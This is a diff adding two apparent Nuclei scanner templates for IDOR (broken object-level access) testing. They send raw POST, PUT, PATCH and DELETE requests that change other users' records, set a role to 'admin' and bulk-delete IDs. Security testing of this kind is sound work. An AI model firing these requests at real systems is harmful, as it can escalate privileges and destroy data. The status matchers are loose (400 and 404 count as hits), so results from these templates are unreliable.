@@ -1,0 +1,201 @@
+id: idor-post-exploitation
+info:
+  name: IDOR - POST Request Exploitation
+  author: Security Research Team
+  severity: high
+  description: |
+    Advanced IDOR testing through POST requests with various payload techniques.
+    Includes form-data, JSON, and XML payload testing.
+  tags:
+    - idor
+    - post
+    - exploitation
+
+requests:
+  # Test 1: JSON POST with ID manipulation
+  - raw:
+      - |
+        POST /api/user/update HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+        
+        {
+          "user_id": 1,
+          "name": "Test",
+          "email": "test@example.com"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+  # Test 2: Form-data IDOR
+  - raw:
+      - |
+        POST /api/profile/update HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        user_id=1&name=Test&email=test@example.com
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # Test 3: XML-based IDOR
+  - raw:
+      - |
+        POST /api/resource/edit HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/xml
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <root>
+          <user_id>1</user_id>
+          <data>Test Data</data>
+        </root>
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 400
+
+  # Test 4: Nested JSON IDOR
+  - raw:
+      - |
+        POST /api/v1/resource/access HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+        
+        {
+          "action": "read",
+          "resource": {
+            "id": 1,
+            "type": "document"
+          }
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  # Test 5: Array-based IDOR
+  - raw:
+      - |
+        POST /api/bulk-delete HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+        
+        {
+          "ids": [1, 2, 3, 4, 5],
+          "confirm": true
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+---
+
+id: idor-rest-methods
+info:
+  name: IDOR - Different REST Methods
+  author: Security Research Team
+  severity: high
+  description: |
+    Tests IDOR across different HTTP methods (PUT, PATCH, DELETE).
+    Some APIs may have inconsistent access controls across methods.
+  tags:
+    - idor
+    - rest
+    - methods
+
+requests:
+  # Test 1: PUT request IDOR
+  - raw:
+      - |
+        PUT /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+        
+        {
+          "name": "Updated Name",
+          "email": "updated@example.com"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+  # Test 2: PATCH request IDOR
+  - raw:
+      - |
+        PATCH /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+        Content-Type: application/json
+        
+        {
+          "role": "admin"
+        }
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+
+  # Test 3: DELETE request IDOR
+  - raw:
+      - |
+        DELETE /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
+          - 404
+
+  # Test 4: HEAD request IDOR
+  - raw:
+      - |
+        HEAD /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 404
+
+  # Test 5: OPTIONS request IDOR
+  - raw:
+      - |
+        OPTIONS /api/users/1 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{auth_token}}
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 204
